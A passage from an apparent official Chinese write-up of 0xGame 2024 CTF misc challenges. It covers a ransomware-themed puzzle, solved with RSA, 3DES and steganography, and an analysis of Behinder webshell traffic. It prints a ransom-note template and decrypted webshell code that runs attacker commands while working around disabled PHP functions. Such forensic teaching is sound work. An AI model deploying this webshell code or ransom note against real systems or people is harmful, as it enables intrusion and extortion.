class="line">NTExNjYyMjMyMDc3MDI1MjcxMzk4MzA0OTUyNTUzODUyOTQ0MjM5OTgwNjM5OTExNDYwMTE1NjA0MjQ3OTE2MjU1NjUwMTc0MzAyNTU0NjMwMTk4MjEzMTAxMzk3MDQzMDk0OTYxMjc1OTQ5ODkwOTUwODg5NDM1NDM2ODg2Nzk1OTQwNzYzODY0MjI3MjUzNTQ0MDc2NzUxMTkzMzUwOTE0NjMzOTUyOTEzNTQ0MTQwMzMyNDE4NjYyMjczNzEyNTQ3OTA4OTgxNTY1MzUxNDEzNjU3NTUzMzYxNDcxNjQzOTIwMzc4ODQwOTk2NDI4NDgyMTI3MDEwNTAzMDI2MDY3NTg3MzkyMDAwMDMwNDY1Mzc3MjAzNDQzNTk3MDI3MTE4OTA3MTE2OTE1MTAyODkwOTcwNDYzNzI=</span><br></pre></td></tr></table></figure><p>最后的一行base64编码显然就是解密用的关键信息。</p><p>需要说明的是，这里用上面的方法去逆向secret.pyc会发现，我们要找的密钥是随机生成的，没法直接得到。secret.py的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line">k3y=<span class="string">b&#x27;Summer&#x27;</span>+get_random_bytes(<span class="number">18</span>)</span><br><span class="line">readme=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hello, w8nn9z! </span></span><br><span class="line"><span class="string">Your file has been encrypted! </span></span><br><span class="line"><span class="string">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span></span><br><span class="line"><span class="string">To recover your files, you must follow the following steps: </span></span><br><span class="line"><span class="string">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span></span><br><span class="line"><span class="string">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span></span><br><span class="line"><span class="string">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span></span><br><span class="line"><span class="string">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span></span><br><span class="line"><span class="string">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么来看下怎么分析这串base64编码，当然首先是解码，得到一串数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51166223207702527139830495255385294423998063991146011560424791625565017430255463019821310139704309496127594989095088943543688679594076386422725354407675119335091463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>通过分析代码得到，这串数字的格式是 n的二进制长度+n+c的二进制长度+c，因此不难进行如下分段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">511</span><br><span class="line">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span><br><span class="line">509</span><br><span class="line">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>使用factordb分解一下n，这里在出题时已经提前将p和q提交到了factordb</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643080-39b31174-8565-4689-b2a2-3d634db908e8.png" alt="img"></p><p>RSA应该不必多说了，网上能找到很多教程，接下来写个脚本解密附件中的autumn.wav.encrypted</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">p=<span class="number">64816076191920076931967680257669007967886202806676552562757735711115285212307</span></span><br><span class="line">q=<span class="number">102170960652478489355215071707263191814765888101601364955857801471459364198319</span></span><br><span class="line">n=<span class="number">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span></span><br><span class="line">c=<span class="number">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">key=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav.encrypted&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext=f.read().strip()</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(padded_plaintext, DES3.block_size)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plaintext)</span><br></pre></td></tr></table></figure><p>这样就成功得到了autumn.wav。先用010editor看一下，在文件末尾可以发现一串暂时不知道干什么用的密码</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643689-fc26364f-d01e-4a5c-aa1e-3edf7a1b967a.png" alt="img"></p><p>这里是存在deepsound的隐写，其实有些师傅看了hint就知道了。这里需要将deepsound更新到较新的版本才能提取出来。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643666-bea466c6-53da-43bc-bb04-649c47c63c9b.png" alt="img"></p><p>打开winter.txt，里面看似什么都没有，但实际上有很多空格，这个是snow隐写</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643630-c9c92b28-926c-4060-a0b6-13ae8a9e0f1d.png" alt="img"></p><p>用前面在010中得到密码提取，得到flag</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805643731-98dce7bb-e92a-45de-90b2-fc02986d94b9.png" alt="img"></p><h3 id="Encrypted-file"><a href="#Encrypted-file" class="headerlink" title="Encrypted file"></a>Encrypted file</h3><p>附件给了一个 <code>secret.php</code> 和一个 <code>Behinder.pcapng</code>，php打开是乱码还不知道有什么用先放一边，先分析流量包，搜搜文件名就大概可以知道是冰蝎流量，网上有很多资料可以参考</p><p>流量前面一大段都是用 <code>dirsearch</code>在扫目录，可以发现攻击者找到一个<code>upload.php</code>，之后就是经典的冰蝎流量分析：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1730805644244-3435aa47-cc8c-47c9-a80e-da9e4e18f585.png" alt="img"></p><p>上传的 <code>shell.php</code> 的作用是对后续的攻击命令进行解密并执行，可以直接用于解密流量里的攻击命令，第一段和第二段分别是在进行密钥协商和返回phpinfo()的命令回显，可以直接从第三段开始往后进行分析</p><p>以第三段为例，直接用流量里的 <code>shell.php</code> 进行解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;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&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果即执行的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ 